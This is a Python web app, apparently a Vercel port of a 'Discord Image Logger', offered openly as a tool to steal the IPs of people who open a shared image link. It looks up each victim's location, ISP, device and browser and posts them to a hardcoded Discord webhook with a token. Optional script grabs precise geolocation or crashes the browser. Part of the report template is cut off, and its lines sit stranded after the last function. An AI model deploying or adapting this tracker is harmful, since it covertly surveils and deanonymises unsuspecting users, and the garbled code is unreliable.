# Discord Image Logger - Vercel (WSGI port)
# Original by DeKrypt | https://github.com/dekrypted

import base64
import os
import traceback
from urllib import parse

import httpagentparser
import requests

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.1-vercel"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": os.environ.get(
        "DISCORD_WEBHOOK",
        "https://discord.com/api/webhooks/1557686272351408198/-dIayA_yXrES-RRzmD9Q300zAlumQZzXoSQ9mldTUooQkZSHkyf-mwqdAV_BCCno4nur",
    ),
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNK3stnuYqsOfj6Hr5DFz8nj4_z1KBHwbr__7arqTyOg&s=10.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,

    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error):
    try:
        requests.post(
            config["webhook"],
            json={
                "username": config["username"],
                "content": "@everyone",
                "embeds": [
                    {
                        "title": "Image Logger - Error",
                        "color": config["color"],
                        "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                    }
                ],
            },
            timeout=10,
        )
    except Exception:
        pass


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return

    useragent = useragent or ""

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(
                config["webhook"],
                json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                },
                timeout=10,
            )
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()

    # Rate limited / lookup failed -> skip instead of reporting a fake clean IP
    if info.get("status") == "fail":
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    tz = info.get("timezone") or "Unknown/Unknown"
    tz_parts = tz.split("/")
    tz_fmt = (
        f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else tz
    )

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info.get('isp') else 'Unknown'}`
> **ASN:** `{info['as'] if info.get('as') else 'Unknown'}`
> **Country:** `{info['country'] if info.get('country') else 'Unknown'}`
> **Region:** `{info['regionName'] if info.get('regionName') else 'Unknown'}`
> **City:** `{info['city'] if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{tz_fmt}`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
}
        ],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed, timeout=10)
    return info


binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}


def get_ip(environ):
    # Vercel-maintained headers first; a client can forge X-Forwarded-For
    for key in ("HTTP_X_VERCEL_FORWARDED_FOR", "HTTP_X_REAL_IP"):
        val = environ.get(key)
        if val:
            return val.split(",")[0].strip()
    fwd = environ.get("HTTP_X_FORWARDED_FOR") or environ.get("REMOTE_ADDR") or ""
    return fwd.split(",")[0].strip()


def get_ua(environ):
    return environ.get("HTTP_USER_AGENT") or ""


def app(environ, start_response):
    path = environ.get("PATH_INFO") or "/"
    query = environ.get("QUERY_STRING") or ""
    ip = get_ip(environ)
    useragent = get_ua(environ)

    try:
        dic = dict(parse.parse_qsl(query))

        if config["imageArgument"] and (dic.get("url") or dic.get("id")):
            url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
        else:
            url = config["image"]

        # Discord / Telegram crawler hitting the link -> serve bugged preview
        if botCheck(ip, useragent):
            makeReport(ip, endpoint=path, url=url)
            if config["buggedImage"]:
                start_response(
                    "200 OK",
                    [
                        ("Content-Type", "image/jpeg"),
                        ("Cache-Control", "no-store, max-age=0"),
                    ],
                )
                return [binaries["loading"]]
            start_response(
                "302 Found",
                [("Location", url), ("Cache-Control", "no-store, max-age=0")],
            )
            return [b""]

        # Real user opened the image
        if dic.get("g") and config["accurateLocation"]:
            location = base64.b64decode(dic.get("g").encode()).decode()
            result = makeReport(ip, useragent, location, path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=path, url=url)

        message = config["message"]["message"]

        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp") or "")
            message = message.replace("{asn}", result.get("as") or "")
            message = message.replace("{country}", result.get("country") or "")
            message = message.replace("{region}", result.get("regionName") or "")
            message = message.replace("{city}", result.get("city") or "")
            message = message.replace("{lat}", str(result.get("lat")))
            message = message.replace("{long}", str(result.get("lon")))
            message = message.replace("{mobile}", str(result.get("mobile")))
            message = message.replace("{vpn}", str(result.get("proxy")))
            message = message.replace(
                "{bot}",
                str(
                    result.get("hosting")
                    if result.get("hosting") and not result.get("proxy")
                    else "Possibly"
                    if result.get("hosting")
                    else "False"
                ),
            )
            message = message.replace(
                "{browser}", httpagentparser.simple_detect(useragent)[1]
            )
            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

        data = f"""<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>""".encode()

        if config["message"]["doMessage"]:
            data = message.encode()

        if config["crashBrowser"]:
            data = message.encode() + (
                b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            )

        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

        if config["accurateLocation"]:
            data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""

        start_response(
            "200 OK",
            [
                ("Content-Type", "text/html; charset=utf-8"),
                ("Cache-Control", "no-store, max-age=0"),
            ],
        )
        return [data]

    except Exception:
        reportError(traceback.format_exc())
        start_response(
            "500 Internal Server Error",
            [("Content-Type", "text/html; charset=utf-8")],
        )
        return [
            b"500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
        ]
**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
